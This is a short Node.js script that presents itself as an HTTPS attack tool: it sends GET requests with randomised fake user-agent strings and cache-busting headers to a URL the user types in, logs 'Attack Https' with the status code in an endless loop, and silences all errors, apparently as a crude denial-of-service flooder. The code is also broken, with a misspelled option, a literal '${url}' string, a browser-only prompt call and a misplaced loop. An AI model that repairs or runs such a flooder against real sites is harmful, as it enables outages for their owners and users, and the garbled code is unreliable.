const request = require('request')
const fakeUa = require('fake-useragent')
const readline = require('readline').createInterface({
  input: process.stdin,
  output: process.stdout
});
const url = prompt('What is your name?');
function run(){
var config={
url:'${url}',
medthod:'get',
headers:{
'user-agent':fakeUa(),
  'Cache-Control': 'no-cache'

}
}
request(config,function(error,response){
  while (true) {
  console.log("Attack Https ",response.statusCode)
  process.on('uncaughtException', function (err) {
});
  process.on('unhandledRejection', function (err) {
});
}
}
)}

run()
